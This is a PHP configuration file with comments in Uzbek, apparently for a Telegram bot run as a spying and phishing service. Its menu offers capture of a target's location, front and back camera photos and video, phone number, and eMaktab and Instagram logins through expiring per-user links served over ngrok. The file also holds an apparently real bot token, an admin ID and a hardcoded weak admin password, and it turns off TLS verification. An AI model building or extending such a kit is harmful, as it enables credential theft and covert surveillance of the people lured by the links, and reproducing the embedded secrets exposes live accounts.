<?php
// config.php - Barcha sozlamalar markazlashtirilgan fayl

// Asosiy sozlamalar (Yangi bot tokeni va Ngrok havolasi kiritildi)
define("BOT_TOKEN", "8799087495:AAH6chgp1Mm3P-0Zz9sKi3wBYingNkNIBU0");
define("BASE_URL", "https://ngrok-free.dev");
define("ADMIN_PANEL_URL", "https://ngrok-free.dev/admin.php");

define("ADMIN_ID", "8543318228");
define("ADMIN_USERNAME", "@sherikboyevk");

// Fayl yo'llari
define("DB_FILE", __DIR__ . "/MUHECTUP/bot_db.sqlite");
define("KEYS_FILE", __DIR__ . "/MUHECTUP/keys.json");
define("CHANNELS_FILE", __DIR__ . "/MUHECTUP/channels.json");
define("ADMINS_FILE", __DIR__ . "/MUHECTUP/admins.json");

// API yo'llari
define("API_PATHS", [
    'location' => 'lk',
    'photo' => 'rm', 
    'video' => 'vd',
    'backcamera' => 'bc',
    'phone' => 'ph',
    'emaktab' => 'em',
    'instagram' => 'reel'
]);

// Majburiy kanallar
$MANDATORY_CHANNELS = [
    '@Shpion_Pro' => [
        'name' => 'Asosiy Kanal',
        'url' => 'https://t.me',
        'required' => true
    ]
];

// Adminlar
$ADMINS = [
    'HeroModder' => [
        'password' => 'HeroModder',
        'role' => 'superadmin',
        'created_at' => time()
    ]
];

// Papka yaratish
if (!is_dir(__DIR__ . '/MUHECTUP')) {
    mkdir(__DIR__ . '/MUHECTUP', 0755, true);
}

// Log yozish funksiyasi
function logActivity($chat_id, $action_type, $action_details = null) {
    try {
        $pdo = getDB();
        $stmt = $pdo->prepare("INSERT INTO activity_logs (chat_id, action_type, action_details, ip_address, user_agent, created_at) VALUES (?, ?, ?, ?, ?, ?)");
        $stmt->execute([
            $chat_id, 
            $action_type, 
            $action_details, 
            $_SERVER['REMOTE_ADDR'] ?? null, 
            $_SERVER['HTTP_USER_AGENT'] ?? null, 
            time()
        ]);
    } catch (Exception $e) {
        error_log("Log yozishda xatolik: " . $e->getMessage());
    }
}

// Database ulanish
function getDB() {
    $pdo = new PDO("sqlite:" . DB_FILE);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    
    // Users jadvali
    $pdo->exec(
        "CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            chat_id INTEGER UNIQUE NOT NULL,
            first_name TEXT,
            username TEXT,
            phone_number TEXT,
            balance INTEGER DEFAULT 0,
            is_banned INTEGER DEFAULT 0,
            subscribed INTEGER DEFAULT 0,
            locations_sent INTEGER DEFAULT 0,
            photos_sent INTEGER DEFAULT 0,
            videos_sent INTEGER DEFAULT 0,
            backcamera_videos INTEGER DEFAULT 0,
            emaktab_logins INTEGER DEFAULT 0,
            instagram_logins INTEGER DEFAULT 0,
            phone_numbers INTEGER DEFAULT 0,
            created_at INTEGER NOT NULL,
            last_activity INTEGER NOT NULL
        )"
    );
    
    // To'lovlar jadvali
    $pdo->exec(
        "CREATE TABLE IF NOT EXISTS payments (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            chat_id INTEGER NOT NULL,
            amount INTEGER NOT NULL,
            description TEXT,
            created_at INTEGER NOT NULL
        )"
    );
    
    // Faollik loglari
    $pdo->exec(
        "CREATE TABLE IF NOT EXISTS activity_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            chat_id INTEGER NOT NULL,
            action_type TEXT NOT NULL,
            action_details TEXT,
            ip_address TEXT,
            user_agent TEXT,
            created_at INTEGER NOT NULL
        )"
    );
    
    return $pdo;
}

// Kalitlarni yuklash
function loadKeys() {
    if (!file_exists(KEYS_FILE)) {
        file_put_contents(KEYS_FILE, json_encode([]));
        return [];
    }
    $data = file_get_contents(KEYS_FILE);
    return json_decode($data, true) ?: [];
}

// Kalitlarni saqlash
function saveKeys($keys) {
    return file_put_contents(KEYS_FILE, json_encode($keys, JSON_PRETTY_PRINT));
}

// Random kalit yaratish
function generateRandomKey($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $key = '';
    for ($i = 0; $i < $length; $i++) {
        $key .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $key;
}

// User kalit yaratish
function getKeyForUser($chat_id, $type = 'video') {
    $keys = loadKeys();
    $now = time();
    
    // Eski keylarni tozalash
    foreach ($keys as $key => $data) {
        if ($data['expires'] < $now) {
            unset($keys[$key]);
        }
    }
    
    // Yangi key yaratish
    $newKey = generateRandomKey(10);
    $keys[$newKey] = [
        'chat_id' => $chat_id,
        'created' => $now,
        'expires' => $now + (24 * 3600),
        'type' => $type
    ];
    
    saveKeys($keys);
    return $newKey;
}

// Kalit orqali foydalanuvchi topish
function getUserFromKey($key) {
    $keys = loadKeys();
    
    if (isset($keys[$key])) {
        $data = $keys[$key];
        if ($data['expires'] > time()) {
            return $data['chat_id'];
        }
    }
    
    return null;
}

// Telegram API
function tgRequest($method, $params = [], $isFile = false) {
    $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/" . $method;

    if (isset($params['reply_markup']) && !is_string($params['reply_markup'])) {
        $params['reply_markup'] = json_encode($params['reply_markup']);
    }

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    
    if ($isFile) {
        curl_setopt($ch, CURLOPT_HTTPHEADER, ["Expect:"]);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
    } else {
        curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
    }
    
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    
    $res = curl_exec($ch);
    $err = curl_error($ch);
    curl_close($ch);
    
    if ($err) {
        error_log("Telegram API error: " . $err);
        return ['ok' => false, 'error' => $err];
    }
    
    return json_decode($res, true);
}

// User management
function addOrUpdateUser($chat_id, $first_name = null, $username = null) {
    $pdo = getDB();
    $stmt = $pdo->prepare("SELECT chat_id FROM users WHERE chat_id = ?");
    $stmt->execute([$chat_id]);
    
    if (!$stmt->fetch()) {
        // Yangi foydalanuvchi
        $stmt = $pdo->prepare("INSERT INTO users (chat_id, first_name, username, created_at, last_activity) VALUES (?, ?, ?, ?, ?)");
        $stmt->execute([$chat_id, $first_name, $username, time(), time()]);
        
        // Log yozish
        logActivity($chat_id, 'user_registered', "Yangi foydalanuvchi ro'yxatdan o'tdi");
    } else {
        // Mavjud foydalanuvchini yangilash
        $stmt = $pdo->prepare("UPDATE users SET first_name = COALESCE(?, first_name), username = COALESCE(?, username), last_activity = ? WHERE chat_id = ?");
        $stmt->execute([$first_name, $username, time(), $chat_id]);
    }
}

function getUser($chat_id) {
    $pdo = getDB();
    $stmt = $pdo->prepare("SELECT * FROM users WHERE chat_id = ?");
    $stmt->execute([$chat_id]);
    return $stmt->fetch(PDO::FETCH_ASSOC);
}

function updateUserStats($chat_id, $field) {
    $pdo = getDB();
    $stmt = $pdo->prepare("UPDATE users SET $field = COALESCE($field, 0) + 1 WHERE chat_id = ?");
    $result = $stmt->execute([$chat_id]);
    
    // Log yozish
    $field_names = [
        'locations_sent' => '📍 Lokatsiya',
        'photos_sent' => '📷 Rasm', 
        'videos_sent' => '🎥 Video',
        'backcamera_videos' => '📹 Orqa kamera',
        'emaktab_logins' => '🔐 eMaktab',
        'instagram_logins' => '📱 Instagram',
        'phone_numbers' => '📞 Telefon raqam'
    ];
    
    if (isset($field_names[$field])) {
        logActivity($chat_id, 'service_used', $field_names[$field] . " xizmati ishlatildi");
    }
    
    return $result;
}

// Kanallarni yuklash
function loadChannels() {
    if (!file_exists(CHANNELS_FILE)) {
        return $GLOBALS['MANDATORY_CHANNELS'];
    }
    $data = file_get_contents(CHANNELS_FILE);
    return json_decode($data, true) ?: $GLOBALS['MANDATORY_CHANNELS'];
}

// Obuna tekshirish (Funksiya to'liq tiklandi)
function checkSubscription($chat_id) {
    $channels = loadChannels();
    $requiredChannels = array_filter($channels, function($channel) {
        return !empty($channel['required']) && $channel['required'] == true;
    });
    
    if (empty($requiredChannels)) {
        return true;
    }
    
    foreach ($requiredChannels as $username => $channel) {
        $res = tgRequest("getChatMember", [
            "chat_id" => $username,
            "user_id" => $chat_id
        ]);
        
        if (!$res || !isset($res["ok"]) || $res["ok"] !== true) {
            return false;
        }
        
        $status = $res["result"]["status"] ?? "";
        if (!in_array($status, ["creator", "administrator", "member"])) {
            return false;
        }
    }
    return true;
}

// Admin tekshirish
function isAdmin($chat_id) {
    return $chat_id == ADMIN_ID;
}

// Asosiy keyboard
function mainKeyboard() {
    return [
        'keyboard' => [
            [
                ['text' => '🔐 Xizmatlar'],
                ['text' => '📊 Statistika']
            ],
            [
                ['text' => '💼 Hisobim'],
                ['text' => '❓ Yordam']
            ],
            [
                ['text' => '❗️ Qoidalar'],
                ['text' => '📞 Bog\'lanish']
            ]
        ],
        'resize_keyboard' => true,
        'one_time_keyboard' => false
    ];
}

// Xizmatlar keyboard
function servicesKeyboard() {
    return [
        'keyboard' => [
            [
                ['text' => '📍 Lokatsiya olish'],
                ['text' => '📷 Rasm olish']
            ],
            [
                ['text' => '🎥 Video yozish'],
                ['text' => '📹 Orqa kamera']
            ],
            [
                ['text' => '📞 Telefon raqam'],
                ['text' => '🔐 eMaktab Login']
            ],
            [
                ['text' => '📱 Instagram Login'],
                ['text' => '🔙 Orqaga']
            ]
        ],
        'resize_keyboard' => true
    ];
}

// Obuna talab keyboard
function needSubscribeKeyboard() {
    return [
        'inline_keyboard' => [
            [
                ['text' => '📢 Kanallarga obuna bo\'lish', 'url' => 'https://t.me/Shpion_Pro']
            ],
            [
                ['text' => '✅ Tekshirish', 'callback_data' => 'check_subscribe']
            ]
        ]
    ];
}

// Hisob ma'lumotlari
function buildAccountText($chat_id) {
    $user = getUser($chat_id);
    if (!$user) {
        return "❌ Foydalanuvchi ma'lumotlari topilmadi.";
    }
    
    $username = $user['username'] ? "@" . $user['username'] : "Yo'q";
    $text = "<b>💼 Mening hisobim</b>\n\n";
    $text .= "👤 <b>Ism:</b> " . htmlspecialchars($user['first_name'] ?? 'Noma\'lum') . "\n";
    $text .= "🆔 <b>Username:</b> " . $username . "\n";
    $text .= "📊 <b>Statistika:</b>\n";
    $text .= "  📍 Lokatsiya: " . ($user['locations_sent'] ?? 0) . "\n";
    $text .= "  📷 Rasm: " . ($user['photos_sent'] ?? 0) . "\n";
    $text .= "  🎥 Video: " . ($user['videos_sent'] ?? 0) . "\n";
    $text .= "  📹 Orqa kamera: " . ($user['backcamera_videos'] ?? 0) . "\n";
    $text .= "  📞 Telefon: " . ($user['phone_numbers'] ?? 0) . "\n";
    $text .= "  🔐 eMaktab: " . ($user['emaktab_logins'] ?? 0) . "\n";
    $text .= "  📱 Instagram: " . ($user['instagram_logins'] ?? 0) . "\n";
    $text .= "📅 <b>Ro'yxatdan o'tilgan:</b> " . date('d.m.Y H:i', $user['created_at']) . "\n";
    
    return $text;
}

?>
